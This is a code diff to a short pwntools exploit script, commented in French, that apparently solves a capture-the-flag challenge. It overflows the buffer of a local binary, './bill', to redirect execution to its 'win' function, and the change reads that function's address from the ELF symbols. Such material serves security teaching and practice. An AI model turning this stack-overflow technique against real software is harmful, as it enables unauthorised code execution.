@@ -1,11 +1,17 @@
-from pwn import p32, process
+from pwn import p32, process, ELF
 
 
-def buffer_overflow(binary_path: str, offset: int, addr_to_write: int) -> str:
+def get_win_addr(binary_path: str) -> int:
+    elf = ELF(binary_path)
+    # L'adresse de la fonction win (récupérée depuis les symboles)
+    return elf.symbols["win"]
+
+
+def buffer_overflow(binary_path: str, offset: int, win_addr: int) -> str:
     io = process(binary_path)
     # Produit le buffer overflow
     payload = b"0" * offset
-    payload += p32(addr_to_write)
+    payload += p32(win_addr)
     io.sendline(payload)
     # Ignore la ligne retournée par le binaire
     io.recvline()
@@ -16,6 +22,8 @@ def buffer_overflow(binary_path: str, offset: int, addr_to_write: int) -> str:
 
 
 if __name__ == "__main__":
-    # Configuration (offset obtenu avec gdb et la commande cyclic -l)
-    flag = buffer_overflow("./bill", offset=129, addr_to_write=0x080491A6)
+    binary_path = "./bill"
+    win_addr = get_win_addr(binary_path)
+    # Offset obtenu avec gdb et la commande cyclic -l
+    flag = buffer_overflow(binary_path, offset=129, win_addr=win_addr)
     print(f"Flag: {flag}")
